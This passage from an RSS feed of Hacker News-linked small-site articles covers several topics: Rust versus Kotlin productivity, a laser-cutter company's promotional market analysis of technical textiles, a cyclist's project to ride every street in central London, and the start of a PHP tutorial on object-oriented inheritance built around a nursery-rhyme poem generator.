<p>At the time of comparison, rust-analyzer is split into 23 internal crates, with a handful general-purposed ones released on crates.io.
In contrast, IntelliJ Rust is a single Kotlin module, where everything can depend on everything else.
Although internal organization of IntelliJ Rust is pretty clean, it‚Äôs not reflected in the file system layout and build system, and needs constant maintenance.</p>
</div>
</div>
<div>
<h2 id="_build_system">Build System</h2>
<div>
<p>Managing project‚Äôs build takes significant amount of times, and has multiplicative effect on everything else.</p>
<p>Rust‚Äôs build system, <a href="https://doc.rust-lang.org/cargo/index.html">Cargo</a>, is very good.
It‚Äôs not perfect, but it is a breath of fresh air after Java‚Äôs <a href="https://gradle.org/">Gradle</a>.</p>
<p>Cargo‚Äôs trick is that it doesn‚Äôt try to be a general purpose build system.
It can only build Rust projects, and it has rigid expectation about the project structure.
It‚Äôs impossible to opt out of the core assumptions.
Configuration is a static non-extensible TOML file.</p>
<p>In contrast, Gradle allows free-form project structure, and is configured via a Turing complete language.
I feel like I‚Äôve spend more time learning Gradle than learning Rust!
Running <code>wc -w</code> gives 182_817 words for Rust book, and 280_506 for Gradle‚Äôs user guide.</p>
<p>Additionally, Cargo is just faster than Gradle in most cases.</p>
<p>Of course, the biggest downside is that custom build logic is not expressible in Cargo.
Both projects needs substantial amount of logic beyond mere compilation to deliver the final result to the user.
For rust-analyzer, this is handled by hand-written Rust script, which works perfectly at this scale.</p>
</div>
</div>
<div>
<h2 id="_ecosystem">Ecosystem</h2>
<div>
<p>Language-level support for libraries and top-notch build system/package manager allow for a thriving ecosystem.
rust-analyzer relies on third-party libraries much more than IntelliJ Rust.
Some parts of rust-analyzer are also published to crates.io for other projects to reuse.</p>
<p>Additionally, low-level nature of the Rust programming language often allows for ‚Äúperfect‚Äù library interfaces.
Interfaces which exactly reflect the underlying problem, without imposing intermediate language-level abstractions.</p>
</div>
</div>
<div>
<h2 id="_basic_conveniences">Basic Conveniences</h2>
<div>
<p>I feel that Rust is significantly more productive when it comes to basic language nuts and bolts‚Äâ‚Äî‚Äâstructs, enums, functions, etc.
This is not specific to Rust‚Äâ‚Äî‚Äâany ML-family language has them.
However, Rust is the first industrial language which wraps these features in a nice package, not constrained by backwards compatibility.
I want to list specific features which I think allow producing maintainable code faster in Rust</p>
<p><em>Emphasis on data over behavior</em>.
Aka, Rust is not an OOP language.
The core idea of OOP is that of dynamic dispatch‚Äâ‚Äî‚Äâwhich code is invoked by a function call is decided at runtime (late binding).
This is a powerful pattern which allows for flexible and extensible system.
The problem is, extensibility is costly!
It‚Äôs better only to apply it in certain designated areas.
Designing for extensibility by default is not cost effective.
Rust puts static dispatch front and center: it is mostly clear whats going on by just reading the code, as it is independent of runtime types of the objects.</p>
<p>One small syntactic thing I enjoy about Rust is how it puts fields and methods into different blocks syntactically:</p>
<div>
<div>
<pre><code data-lang="rust"><span>struct</span> <span>Person</span> <span>{</span>
  <span>first_name</span><span>:</span> <span>String</span><span>,</span>
  <span>last_name</span><span>:</span> <span>String</span><span>,</span>
<span>}</span>

<span>impl</span> <span>Person</span> <span>{</span>
    <span>fn</span> <span>full_name</span><span>(</span><span>&amp;</span><span>self</span><span>)</span> <span>-&gt;</span> <span>String</span> <span>{</span>
        <span>...</span>
    <span>}</span>
<span>}</span></code></pre>
</div>
</div>
<p>Being able to see at a glance all the fields makes understanding the code much simpler.
Fields convey much more information than methods.</p>
<p><em>Sum types</em>.
Rust‚Äôs humbly named enums are full algebraic data types.
This means that you can express the idea of disjoint union:</p>
<div>
<div>
<pre><code data-lang="rust"><span>enum</span> <span>Either</span><span>&lt;</span><span>A</span><span>,</span> <span>B</span><span>&gt;</span> <span>{</span> <span>A</span><span>(</span><span>A</span><span>),</span> <span>B</span><span>(</span><span>B</span><span>)</span> <span>}</span></code></pre>
</div>
</div>
<p>This is hugely useful in day-to-day programming in the small, and some times during programming in the large as well.
To give one example, one of the core concepts for an IDE are references and definitions.
A definition a like <code>let foo = 92;</code> assigns a name to an entity which can be used down a line.
A reference like <code>foo + 90</code> <em>refers</em> to some definition.
When you ctrl-click on reference, you go to the definition.</p>
<p>Natural way to model that in Kotlin is by adding <code>interface Definition</code> and <code>interface Reference</code>.
The problem is, some things are ‚Ä¶</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ferrous-systems.com/blog/rust-as-productive-as-kotlin/">https://ferrous-systems.com/blog/rust-as-productive-as-kotlin/</a></em></p>]]>
            </description>
            <link>https://ferrous-systems.com/blog/rust-as-productive-as-kotlin/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24939875</guid>
            <pubDate>Fri, 30 Oct 2020 07:10:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Brief market analysis of technical textiles]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24939568">thread link</a>) | @Mimowork
<br/>
October 29, 2020 | https://www.mimowork.com/news/brief-market-analysis-of-technical-textiles.html | <a href="https://web.archive.org/web/*/https://www.mimowork.com/news/brief-market-analysis-of-technical-textiles.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Textiles have always played an important role in different occasions and different applications. From simple protection from the cold to now used in <strong>home decoration, industrial filtration, building, insulation, and other industries</strong>, textiles begin to provide more functions beyond their own value. The research on textile materials and processing technology has given technical textiles more functions to meet the different needs of users.</p><p>According to data statistics, the market value of technical textiles in 2019 reached $201.2 billion and is estimated to grow rapidly at a compound annual growth rate of 5.1% in the following seven years. Such a huge market size and rapid growth rate indicate the development potential of the technical textile market, and also witness that consumer demand is changing. <strong>Antibacterial, anti-mildew, flame retardant, insulation, waterproof and other functions</strong> have been added to ordinary textiles. Textile manufacturers have gradually optimized their development strategies and changed their development directions to occupy a place in the textile market under the favorable conditions that technical textiles are popular and have broad prospects.</p><p><img src="https://www.mimowork.com/data/upload/ueditor/20201020/5f8e5a90c61ff.jpg" title="Brief market analysis of technical textiles" alt="Brief market analysis of technical textiles"></p><p><strong>Which industries will steer the development of technical textiles in the future?</strong></p><p>The current public's attention to <strong>health care</strong> has greatly promoted the development of medical protective clothing. <a href="https://www.youtube.com/watch?v=KV1dN1wm-NI" target="_self" title="Laser Cutting Face Mask"><strong>Face masks</strong></a> and protective clothing are not only adopted in the medical field but also widely used in daily life. Non-woven fabrics have become the preferred material for protective products due to their lightweight, breathability, good protective effect, durability, and environmental protection. The non-woven market is anticipated to develop rapidly in the next 7 years with a growth rate of 5.7%. This is why most textile manufacturers invest more funds in protective products.</p><p><img src="https://www.mimowork.com/data/upload/ueditor/20201020/5f8e590379712.png" title="Brief market analysis of technical textiles" alt="Brief market analysis of technical textiles"></p><p>Resource from: alliedmarketresearch</p><p>In addition to the medical field, end users in the <strong>construction, filtration, packaging, and automotive industries</strong> are considered to have a major driving force for the development of future technical textiles. The prosperous development of these industries and the rapid rise of the vast emerging economies have provided a gradual expansion market for technical textiles.</p><p><strong>Challenges faced and exploration of solutions</strong></p><p>The technological advancement and material innovation of technical textiles have also injected a boost for manufacturers in this market despite the temporary disruption of the supply chain. However, facing the rapid development of the technical textile market and the emergence of more and more competitors, how to improve market competitiveness has become an urgent problem for technical textile manufacturers to think about. Moreover, the public's attention to ecological issues has made environmentally friendly textile materials widely concerned. Based on this background, the control of raw material costs and the disposal of toxic wastes require technical textile manufacturers to find effective ways and strategies to solve them.</p><p><img src="https://www.mimowork.com/data/upload/ueditor/20201020/5f8e5a648a151.jpg" title="Brief market analysis of technical textiles" alt="Brief market analysis of technical textiles"><img src="https://www.mimowork.com/data/upload/ueditor/20201020/5f8e5a822a648.jpg" title="Brief market analysis of technical textiles" alt="Brief market analysis of technical textiles"></p><p>On the one hand, integration with the fashion industry may be a way for technical textile manufacturers to increase the added value of textiles. <a href="https://www.mimowork.com/digital-printing/" target="_self" title="Digital Printing Textiles"><strong>Digital printing</strong></a>, <a href="https://www.mimowork.com/sublimation-apparel/laser-cutting-sublimation-apparel.html" target="_self" title="Laser Cutting Sublimation Apparel"><strong>sublimation printing</strong></a>, and other technologies have been widely used in the field of apparel and home textiles, especially <strong>sportswear</strong>. Sportswear with multiple functions such as waterproof, quick-drying, and odor-resistant, with the support of sublimation printing technology, is suitable for outdoor or indoor sportsmen while providing safety guarantees, it also optimizes the wearing experience. On the other hand, technical textile manufacturers oriented to the industrial processing sector also need to seize opportunities, seek for high-quality partners, and innovate processing technologies to maintain market competitiveness.</p><p><strong>Application and advantages of laser cutting technical textiles</strong></p><p>Whether it is <strong>home textiles, clothing, or industrial fabrics</strong>, technical textiles are the long-term development direction of these fields in the future. <strong>Laser cutting technology</strong> is creating growing revenue for these technical textile manufacturers. Owing to its high-precision cutting, timely edge banding, and high-degree of automation,&nbsp;<a href="https://www.mimowork.com/athletic-apparel-and-technical-clothing/laser-cutting-athletic-apparel-and-technical-clothing.html" target="_self" title="Laser Cutting Athletic Apparel and Technical Clothing"><strong>laser cutting technical textiles</strong></a>&nbsp;has become an investment direction for more and more manufacturers.&nbsp;</p><p><a href="https://www.mimowork.com/flatbed-laser-cutting-machine/flatbed-laser-cutter-160.html" target="_self" title="FLATBED LASER CUTTER 160"><img src="https://www.mimowork.com/data/upload/ueditor/20201020/5f8e5a9ea3adf.jpg" title="Brief market analysis of technical textiles" alt="Brief market analysis of technical textiles"></a></p><p>It has always been <a href="https://www.mimowork.com/about-us/" target="_self" title="Laser Cutter Manufacturer"><strong>Mimowork</strong></a>'s business philosophy to design customized and suitable laser processing solutions for customers to solve their worries. We are always available to help you if you are interested in laser cutting or want to consult laser-related issues. Please feel free to contact us!</p><p><a href="https://www.mimowork.com/" target="_self" title="Laser Cutting Machine Manufacturer"><strong>https://mimowork.com/</strong></a></p></div></div>]]>
            </description>
            <link>https://www.mimowork.com/news/brief-market-analysis-of-technical-textiles.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24939568</guid>
            <pubDate>Fri, 30 Oct 2020 05:56:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cycling through all the streets in central London]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24939328">thread link</a>) | @quickthrower2
<br/>
October 29, 2020 | http://davis.vilums.me/all-the-streets/ | <a href="https://web.archive.org/web/*/http://davis.vilums.me/all-the-streets/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="themify_builder_content-660" data-postid="660">
    	<!-- module_row -->
	<div data-fullwidthvideo="https://www.youtube.com/watch?v=0nA_H-57i-w">
	    	    <div>
			<div>
	    	    	        <div>
		    <!-- module text -->
<div>
            <p>
    <h3>Cycling through</h3>

<h3>in central London</h3>    </p>
</div>
<!-- /module text -->
	        </div>
	    	</div>
		    </div>
	    <!-- /row_inner -->
	</div>
	<!-- /module_row -->
		<!-- module_row -->
	<div>
	    	    <div data-basecol="2" data-col_tablet="column-full">
			<div>
	    	    	        <div>
		    <!-- module text -->
<div>
            <p>
    <h2>Why?</h2>
<h3>I am a passionate cyclist, and I love the streets of London. Most of my travels are daily 25-minute rides to work. Over time my route became boring. I decided to make it a little bit more interesting by taking the parallel streets on my way there. I bought a map of central London and started to colour in the streets to mark the routes that I have taken. And then I got obsessed with it.</h3>    </p>
</div>
<!-- /module text -->
	        </div>
	    	</div>
		<div>
	    	    	        <div>
		        <!-- module image -->
    <div>
	                <p><img src="http://davis.vilums.me/wp-content/uploads/2019/10/ezgif.com-optimize-6.gif" alt="ezgif.com-optimize (6)" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">            
                        </p>
            <!-- /image-wrap -->
        
        
        </div>
    <!-- /module image -->
	        </div>
	    	</div>
		    </div>
	    <!-- /row_inner -->
	</div>
	<!-- /module_row -->
		<!-- module_row -->
	<div>
	    	    <div>
			<div>
	    	    	        <div>
		    	<div>
	    	    <div data-tablet_dir="rtl" data-mobile_dir="rtl" data-basecol="2" data-col_tablet="column-full" data-col_tablet_landscape="column4-2" data-col_mobile="column-full">
			<div> 
	    	    	        <div>
		        <!-- module image -->
    <div>
	                <p><a href="http://davis.vilums.me/wp-content/uploads/2019/09/IMG_0674.jpg">
                                           <img src="http://davis.vilums.me/wp-content/uploads/2019/09/IMG_0674.jpg" alt="Both of the maps that I mainly used" srcset="http://davis.vilums.me/wp-content/uploads/2019/09/IMG_0674.jpg 4032w, http://davis.vilums.me/wp-content/uploads/2019/09/IMG_0674-300x225.jpg 300w, http://davis.vilums.me/wp-content/uploads/2019/09/IMG_0674-1024x768.jpg 1024w" sizes="(max-width: 4032px) 100vw, 4032px" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://davis.vilums.me/wp-content/uploads/2019/09/IMG_0674.jpg" data-lazy-srcset="http://davis.vilums.me/wp-content/uploads/2019/09/IMG_0674.jpg 4032w, http://davis.vilums.me/wp-content/uploads/2019/09/IMG_0674-300x225.jpg 300w, http://davis.vilums.me/wp-content/uploads/2019/09/IMG_0674-1024x768.jpg 1024w">                </a>
            
                        </p>
            <!-- /image-wrap -->
        
        
        </div>
    <!-- /module image -->
	        </div>
	    	</div>
		<div> 
	    	    	        <div>
		    <!-- module text -->
<div>
            <div>
    <h2>How did I do it?</h2>
<p>In the beginning, I used the ‚Äú<a href="https://www.az.co.uk/london-a-z-map-walks.html">London A-Z Map &amp; Walks</a>‚Äù map. It covered a significant amount of central London, but it wasn‚Äôt enough, and the shape was not regular. So I found the ‚Äú<a href="https://www.az.co.uk/london-super-scale-a-z-map.html">London Super Scale A-Z Map</a>‚Äù that was rectangular and covered a larger area. An essential thing for the map of my choice was that streets are laid out very accurately. Including some irregular times off, overall it took me four years to visit every single road on the map. When I started this hobby, it took me 30 to 40 minutes to do the route. Later it expanded to 2 hours to get to the office when I tried to reach the furthest places on my map. One of the main goals was never to be late for work. From the beginning, I planned to visit not only the main roads but every single accessible mews, yard, park trail, and a path that was possible to go through. I used Endomondo app to have a proper record of my journeys and proof that I have been there. After every trip, I prepared my next route in Google maps where it was easy to adjust streets to the next ones and mark points to revisit if I missed something.</p>    </div>
</div>
<!-- /module text -->
	        </div>
	    	</div>
		    </div>
	</div><!-- /themify_builder_sub_row -->
		<div>
	    	    <div data-tablet_landscape_dir="rtl" data-basecol="2" data-col_tablet="column-full" data-col_tablet_landscape="column4-2">
			<div> 
	    	    	        <div>
		    <!-- module text -->
<div>
            <div>
    <h2>How was it?&nbsp;</h2>
<p>The most satisfying feeling I got when I found a shortcut in some of my trails. It was like finding some portal that links two separated parts on the map. There were some obstacles, like road closures or construction works, that sometimes prevented me from accessing the streets. I marked all of those streets as necessary to visit later when the street was accessible again (like London bridge station surroundings and few streets around Barbican etc.). Occasionally I found my route trough yards and gardens that are not visited by passersby very often. If anyone asked how did I get there, I had to pretend to be lost. I take traffic and rules very seriously, so I always have to be aware of the surroundings in unfamiliar places. If it is not allowed to cycle through the park, I always push my bicycle instead.</p>    </div>
</div>
<!-- /module text -->
    <!-- module image -->
    <div>
	                <p><a href="http://davis.vilums.me/wp-content/uploads/2019/10/a-1.jpg">
                                           <img src="http://davis.vilums.me/wp-content/uploads/2019/10/a-1-470x352.jpg" width="470" alt="Fully coloured &quot;London Super Scale A-Z Map&quot;" srcset="http://davis.vilums.me/wp-content/uploads/2019/10/a-1-470x352.jpg 470w, http://davis.vilums.me/wp-content/uploads/2019/10/a-1-300x225.jpg 300w, http://davis.vilums.me/wp-content/uploads/2019/10/a-1-1024x768.jpg 1024w, http://davis.vilums.me/wp-content/uploads/2019/10/a-1-450x337.jpg 450w, http://davis.vilums.me/wp-content/uploads/2019/10/a-1.jpg 2000w" sizes="(max-width: 470px) 100vw, 470px" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://davis.vilums.me/wp-content/uploads/2019/10/a-1-470x352.jpg" data-lazy-srcset="http://davis.vilums.me/wp-content/uploads/2019/10/a-1-470x352.jpg 470w, http://davis.vilums.me/wp-content/uploads/2019/10/a-1-300x225.jpg 300w, http://davis.vilums.me/wp-content/uploads/2019/10/a-1-1024x768.jpg 1024w, http://davis.vilums.me/wp-content/uploads/2019/10/a-1-450x337.jpg 450w, http://davis.vilums.me/wp-content/uploads/2019/10/a-1.jpg 2000w">                </a>
            
                        </p>
            <!-- /image-wrap -->
        
        
        </div>
    <!-- /module image -->
	        </div>
	    	</div>
		<div> 
	    	    	        <div>
		        <!-- module image -->
    <div>
	                <p><a href="http://davis.vilums.me/wp-content/uploads/2019/09/IMG_20190505_111430.jpg">
                                           <img src="http://davis.vilums.me/wp-content/uploads/2019/09/IMG_20190505_111430.jpg" alt="" srcset="http://davis.vilums.me/wp-content/uploads/2019/09/IMG_20190505_111430.jpg 2736w, http://davis.vilums.me/wp-content/uploads/2019/09/IMG_20190505_111430-225x300.jpg 225w, http://davis.vilums.me/wp-content/uploads/2019/09/IMG_20190505_111430-768x1024.jpg 768w" sizes="(max-width: 2736px) 100vw, 2736px" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://davis.vilums.me/wp-content/uploads/2019/09/IMG_20190505_111430.jpg" data-lazy-srcset="http://davis.vilums.me/wp-content/uploads/2019/09/IMG_20190505_111430.jpg 2736w, http://davis.vilums.me/wp-content/uploads/2019/09/IMG_20190505_111430-225x300.jpg 225w, http://davis.vilums.me/wp-content/uploads/2019/09/IMG_20190505_111430-768x1024.jpg 768w">                </a>
            
                        </p>
            <!-- /image-wrap -->
        
        
        </div>
    <!-- /module image -->
	        </div>
	    	</div>
		    </div>
	</div><!-- /themify_builder_sub_row -->
		        </div>
	    	</div>
		    </div>
	    <!-- /row_inner -->
	</div>
	<!-- /module_row -->
		<!-- module_row -->
	
	<!-- /module_row -->
		<!-- module_row -->
	<div>
	    	    <div data-basecol="3" data-col_tablet="column-full" data-col_mobile="column-full">
			
		<div>
	    	    	        <div>
		    <!-- module text -->
<div>
            <div>
    <h2>Wrapping it up all together</h2>
<p>I exported all my tracks from the Endomondo app and put together in a single video. Now we can see how I gradually covered all the visible space on the map, and the result was very pleasing. It resulted in thunderstorm type of effect where each path looks like a lightning flash, that reveals London‚Äôs street grid.</p>

<p><a href="http://davis.vilums.me/wp-content/uploads/2019/10/PicturesCompressed.mp4">Longer linear time version</a></p>
    </div>
</div>
<!-- /module text -->
	        </div>
	    	</div>
		
		    </div>
	    <!-- /row_inner -->
	</div>
	<!-- /module_row -->
		<!-- module_row -->
	<div>
	    	    <div data-basecol="3" data-col_tablet="column-full" data-col_mobile="column-full">
			
		<div>
	    	    	        <div>
		    <!-- module text -->
<div>
            <div>
    <h2>Conclusion&nbsp;</h2>
<p>That was an enjoyable waste of time, and I liked every bit of it, planning, executing and then colouring in the streets and paths where my route took place. I found it a great way how to discover new areas in London and familiarise all the boroughs of central London. This journey for me made every corner of central London feel like home.</p>    </div>
</div>
<!-- /module text -->
    <!-- module image -->
    <div>
	                <p><img src="http://davis.vilums.me/wp-content/uploads/2019/10/IMG_20191027_160926-1-1.jpg" alt="IMG_20191027_160926 (1) (1)" srcset="http://davis.vilums.me/wp-content/uploads/2019/10/IMG_20191027_160926-1-1.jpg 1000w, http://davis.vilums.me/wp-content/uploads/2019/10/IMG_20191027_160926-1-1-300x283.jpg 300w" sizes="(max-width: 1000px) 100vw, 1000px" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://davis.vilums.me/wp-content/uploads/2019/10/IMG_20191027_160926-1-1.jpg" data-lazy-srcset="http://davis.vilums.me/wp-content/uploads/2019/10/IMG_20191027_160926-1-1.jpg 1000w, http://davis.vilums.me/wp-content/uploads/2019/10/IMG_20191027_160926-1-1-300x283.jpg 300w">            
                        </p>
            <!-- /image-wrap -->
        
        
        </div>
    <!-- /module image -->
<!-- module text -->
<div>
            <div>
    <p>cycling@vilums.me&nbsp;</p>
<p><a href="https://www.youtube.com/watch?v=BWpnqRTDIWQ&amp;list=PLd0jT172k7naa8ALKDXwyu6uiNN3Dc8ZN">YouTube</a></p>
<p><a href="https://www.instagram.com/davisvilums/">Instagram</a></p>
<p><a href="http://davis.vilums.me/visas-ielas/">Latviski</a></p>
<p>&nbsp;<a href="https://londonist.com/london/transport/cycle-every-street-central-london">Londonist Article</a></p>
<p><a href="https://www.reci.pe/">Recipe</a></p>
<p><a href="https://www.givingforlatvia.com/">Giving for Latvia</a></p>

<h5>If you like what I‚Äôm doing, please, help me get a new bike?</h5>
    </div>
</div>
<!-- /module text -->
	        </div>
	    	</div>
		
		    </div>
	    <!-- /row_inner -->
	</div>
	<!-- /module_row -->
	</div></div>]]>
            </description>
            <link>http://davis.vilums.me/all-the-streets/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24939328</guid>
            <pubDate>Fri, 30 Oct 2020 05:01:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Object Oriented Done Right]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24939258">thread link</a>) | @brendt_gd
<br/>
October 29, 2020 | https://front-line-php.com/object-oriented | <a href="https://web.archive.org/web/*/https://front-line-php.com/object-oriented">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
            
<div>
    <p>Alan Kay, the inventor of the term ‚Äúobject-oriented programming‚Äù, told a story once during a talk more than 20 years ago. You can build a dog house using only a hammer, nails, planks, and just a little bit of skill. I figure even I would be able to build it given enough time. Once you've built it you've earned the skills and know-how, and could apply it to other projects. Next, you want to build a cathedral, using the same approach with your hammer, nails, and planks. It's a 100 times larger, but you've done this before ‚Äî right? It'll only take a little longer.</p>

    <p>While the scale went up by a factor of 100, its mass went up by a factor of 1.000.000 and its strength only by 10.000. Inevitably, the building will collapse. Some people plaster over the rubble, make it into a pyramid and say it was the plan all along; but you and I know what really went on.</p>

    <p>Alan used this metaphor to explain a critical problem he saw with ‚Äúmodern OOP‚Äù 20 years ago. I think it still holds today: we've taken the solution to a problem ‚Äî OO code ‚Äî we've scaled it by a factor of 100, and expected it to work the same way. Today still, we don't think enough about architecture ‚Äî which is rather crucial if you're building a cathedral ‚Äî we use the OO solutions we learned without any extra thought. Most of us learned OO in isolation with small examples, and rarely at scale. In most real life projects, you cannot simply apply the patterns you've learned and expect everything to fall into place the same way it did with Animals, Cats, and Dogs.</p>
    <p>This reckless scaling of OO code is what cause many people to voice their disapproval of it in recent years. Personally I believe OOP is as good a tool as any other ‚Äî functional programming being the modern-day popular contestant ‚Äî <em>if</em> used correctly.</p>
    <p>My takeaway from Alan's vision is that each object is a little program on its own, with its own internal state. Objects send messages between each other ‚Äî packages of immutable data ‚Äî which other objects can interpret and react to. You can't write all code this way, and that's fine ‚Äî it's fine to not blindly follow these rules.
        Still, I have experienced the positive impact of this mindset first hand. Thinking of objects as little standalone programs, I started writing parts of my code in a different style. I hope that, now that we're going to look at OOP, you'll keep Alan's ideas in mind. Don't blindly apply patterns and principles. Try to look at what you're building as a whole.</p>
    <h2 id="the-pitfall-of-inheritance"><a href="#the-pitfall-of-inheritance">#</a> The pitfall of inheritance</h2>
    <p>I found it difficult to believe at first, but classes and inheritance have nothing to do with OOP the way Alan envisioned it. That doesn't mean they are bad things per se, but it <em>is</em> good to think about their purpose and how we can use, as well as abuse them.
        Alan's vision only described objects ‚Äî it didn't describe how those objects were created. Classes were added later as a convenient way to manage objects, but they are only an implementation detail, not the core idea of OOP. With classes came inheritance, another a useful tool when used correctly. That hasn't been the case though: the problem Alan tried to address 20 years ago still exists today.</p>
    <p>One of the acclaimed strengths of OOP is that it models our code in ways humans think about the world. In reality though, we rarely think in terms of abstractions and inheritance. Instead of using inheritance in places where it actually makes sense, we've been abusing it as a way to share code, and to configure objects in an obscure way.
        I'm going to show you a great example that illustrates this problem, though I want to say up front that it isn't my own: it's Sandi Metz's, a great teacher on the subject of OOP. Let's take a look.</p>
    <p>There's a children's nursery rhyme called ‚ÄúThe House That Jack Built‚Äù (it's also a horror movie but that's unrelated).
        It starts like this:</p>
    <pre><code>This is the house that Jack built.</code></pre>
    <p>Every iteration there's a sentence added to it:</p>
    <pre><code>This is the malt that lay in
        the house that Jack built.</code></pre>
    <p>And next:</p>
    <pre><code>This is the rat that ate
        the malt that lay in
        the house that Jack built.</code></pre>
    <p>Get it? This is the final poem:</p>
    <pre><code>This is the horse and the hound and the horn that belonged to
        the farmer sowing his corn that kept
        the rooster that crowed in the morn that woke
        the priest all shaven and shorn that married
        the man all tattered and torn that kissed
        the maiden all forlorn that milked
        the cow with the crumpled horn that tossed
        the dog that worried
        the cat that killed
        the rat that ate
        the malt that lay in
        the house that Jack built.</code></pre>
    <p>Let's code this together, I'll be using PHP. We're going to make a program that you can ask a given iteration, and it will produce the poem up until that point. Let's do it in an OO way. We start by adding all parts into a data array within a class; let's call that class <code><span>PoemGenerator</span></code> ‚Äî sounds very OO, right? Good.</p>
    <pre><code><span><span>class</span> <span>PoemGenerator</span>
</span>{
    <span>private</span> <span>static</span> <span>array</span> <span>$data</span> = [
        <span>'the horse and the hound and the horn that belonged to'</span>,
        <span>'the farmer sowing his corn that kept'</span>,
        <span>'the rooster that crowed in the morn that woke'</span>,
        <span>'the priest all shaven and shorn that married'</span>,
        <span>'the man all tattered and torn that kissed'</span>,
        <span>'the maiden all forlorn that milked'</span>,
        <span>'the cow with the crumpled horn that tossed'</span>,
        <span>'the dog that worried'</span>,
        <span>'the cat that killed'</span>,
        <span>'the rat that ate'</span>,
        <span>'the malt that lay in'</span>,
        <span>'the house that Jack built'</span>,
    ];
}</code></pre>
    <p>Now let's add two methods <code><span>generate</span></code> and <code><span>phrase</span></code>. <code><span>generate</span></code> will return the end result, and <code><span>phrase</span></code> is an internal function that glues the parts together.</p>
    <pre><code><span><span>class</span> <span>PoemGenerator</span>
</span>{
    

    <span>public</span> <span><span>function</span> <span>generate</span><span>(<span>int</span> $number)</span>: <span>string</span>
    </span>{
        <span>return</span> <span>"This is {$this-&gt;<span>phrase</span>($number)}."</span>;
    }

    <span>protected</span> <span><span>function</span> <span>phrase</span><span>(<span>int</span> $number)</span>: <span>string</span>
    </span>{
        $parts = <span>array_slice</span>(<span>self</span>::<span>$data</span>, -$number, $number);

        <span>return</span> <span>implode</span>(<span>"\n        "</span>, $parts);
    }
}</code></pre>
    <p>It seems like our solution works: we can use <code><span>phrase</span></code> to take x-amount of items from the end of our data array and implode those into one phrase; next we use <code><span>generate</span></code> to wrap the final result with <code>This is</code> and <code>.</code>. By the way, I implode on that spaced delimiter just to format the output a little nicer.</p>
    <pre><code>$generator = <span>new</span> <span>PoemGenerator</span>();

$generator-&gt;<span>generate</span>(<span>4</span>);




</code></pre>
    <p>Exactly what we'd expect the result to be.</p>
    <hr>
    <p>Then comes along‚Ä¶ a new feature request. Let's build a <em>random</em> poem generator: it will randomise the order of the phrases. How do we solve this in a clean way without copying and duplicating code? Inheritance to the rescue ‚Äî right?
        First let's do a little refactor, let's add a protected <code><span>data</span></code> method, so that we have a little more flexibility in what it actually returns:</p>
    <pre><code><span><span>class</span> <span>PoemGenerator</span>
</span>{
    <span>protected</span> <span><span>function</span> <span>phrase</span><span>(<span>int</span> $number)</span>: <span>string</span>
    </span>{
        $parts = <span>array_slice</span>(<span><span>$this</span>-&gt;<span>data</span>()</span>, -$number, $number);

        <span>return</span> <span>implode</span>(<span>"\n        "</span>, $parts);
    }

<span>    <span>protected</span> <span><span>function</span> <span>data</span><span>()</span>: <span>array</span>
    </span>{
        <span>return</span> [
            <span>'the horse and the hound and the horn that belonged to'</span>,
            
            <span>'the house that Jack built'</span>,
        ];
    }</span>}</code></pre>
    <p>Next we build our <code><span>RandomPoemGenerator</span></code>:</p>
    <pre><code><span><span>class</span> <span>RandomPoemGenerator</span> <span>extends</span> <span>PoemGenerator</span>
</span>{
    <span>protected</span> <span><span>function</span> <span>data</span><span>()</span>: <span>array</span>
    </span>{
        $data = <span>parent</span>::<span>data</span>();

        <span>shuffle</span>($data);

        <span>return</span> $data;
    }
}</code></pre>
    <p>How great is inheritance! We only needed to override a small part of our code, and everything works just as expected!</p>
    <pre><code>$generator = <span>new</span> <span>RandomPoemGenerator</span>();

$generator-&gt;<span>generate</span>(<span>4</span>);</code></pre>
    <pre><code>This is the priest all shaven and shorn that married
        the cow with the crumpled horn that tossed
        the man all tattered and torn that kissed
        the rooster that crowed in the morn that woke.</code></pre>
    <p>Awesome!</p>
    <hr>
    <p>Once again‚Ä¶ a new feature request: an echo generator: it repeats every line a second time. So you'd get this:</p>
    <pre><code>This is the malt that lay in the malt that lay in
        the house that Jack built the house that Jack built.</code></pre>
    <p>We can solve this; inheritance ‚Äî right?</p>
    <p>Let's again do a small refactor in <code><span>PoemGenerator</span></code>, just to make sure our code stays clean! Let's extract the array slicing functionality in <code><span>phrase</span></code> to its own method, because that's a better separation of concerns ‚Äî which we learned is a good thing!</p>
    <pre><code><span><span>class</span> <span>PoemGenerator</span>
</span>{
    

    <span>protected</span> <span><span>function</span> <span>phrase</span><span>(int $number)</span>: <span>string</span>
    </span>{
        $parts = <span><span>$this</span>-&gt;<span>parts</span>($number)</span>;

        <span>return</span> <span>implode</span>(<span>"\n        "</span>, $parts);
    }

<span>    <span>protected</span> <span><span>function</span> <span><span>parts</span></span><span>(int $number)</span>: <span>array</span>
    </span>{
        <span>return</span> <span>array_slice</span>(<span>$this</span>-&gt;<span>data</span>(), -$number, $number);
    }</span>}</code></pre>
